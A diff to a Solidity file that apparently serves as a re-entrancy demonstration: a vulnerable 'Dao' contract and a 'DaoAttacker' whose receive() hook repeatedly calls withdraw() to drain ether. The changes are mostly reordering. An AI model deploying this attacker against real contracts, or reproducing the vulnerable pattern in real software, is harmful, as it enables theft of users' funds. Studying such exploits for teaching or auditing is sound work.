@@ -1,7 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
-contract Dao {
+interface IDao {
+    function deposit() external payable;
+    function withdraw() external;
+    function getBalance(address account) external view returns (uint256);
+}
+
+contract Dao is IDao {
     mapping(address => uint256) public balances;
 
     // Payable constructor
@@ -29,16 +35,10 @@ contract Dao {
     }
 }
 
-interface IDao {
-    function deposit() external payable;
-    function withdraw() external;
-    function getBalance(address account) external view returns (uint256);
-}
-
 contract DaoAttacker {
     IDao dao;
-    uint public calls; // Counter for the number of re-entrancy calls
     uint maxCalls; // Maximum allowed recursive calls
+    uint calls; // Counter for the number of re-entrancy calls
 
     constructor(address _dao, uint _maxCalls) payable {
         require(
@@ -49,6 +49,13 @@ contract DaoAttacker {
         maxCalls = _maxCalls;
     }
 
+    receive() external payable {
+        calls += 1;
+        if (calls < maxCalls && address(dao).balance >= 1 ether) {
+            dao.withdraw();
+        }
+    }
+
     function attack() public payable {
         calls = 0;
         if (dao.getBalance(address(this)) == 0) {
@@ -57,10 +64,4 @@ contract DaoAttacker {
         dao.withdraw();
     }
 
-    receive() external payable {
-        calls += 1;
-        if (calls < maxCalls && address(dao).balance >= 1 ether) {
-            dao.withdraw();
-        }
-    }
 }
